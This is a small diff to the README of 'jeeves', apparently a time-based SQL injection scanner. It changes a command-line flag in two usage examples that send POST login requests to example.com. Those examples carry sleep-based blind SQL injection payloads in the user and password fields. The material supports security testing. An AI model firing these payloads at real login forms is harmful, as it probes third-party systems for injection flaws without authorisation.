@@ -86,8 +86,8 @@ Sending data through post request ( login forms, etc )
 Pay attention to the syntax! Must be equal! ->
 
 ```bash
-echo "https://example.com/Login.aspx" | jeeves -p 10 -d "user=(select(0)from(select(sleep(5)))v)&password=xxx"
-echo "https://example.com/Login.aspx" | jeeves -p 10 -H "Header1: Value1" -d "username=admin&password='+(select*from(select(sleep(5)))a)+'" -p "http://yourproxy:port"
+echo "https://example.com/Login.aspx" | jeeves -t 10 -d "user=(select(0)from(select(sleep(5)))v)&password=xxx"
+echo "https://example.com/Login.aspx" | jeeves -t 10 -H "Header1: Value1" -d "username=admin&password='+(select*from(select(sleep(5)))a)+'" -p "http://yourproxy:port"
 ```
 
 ## Another ways of Usage
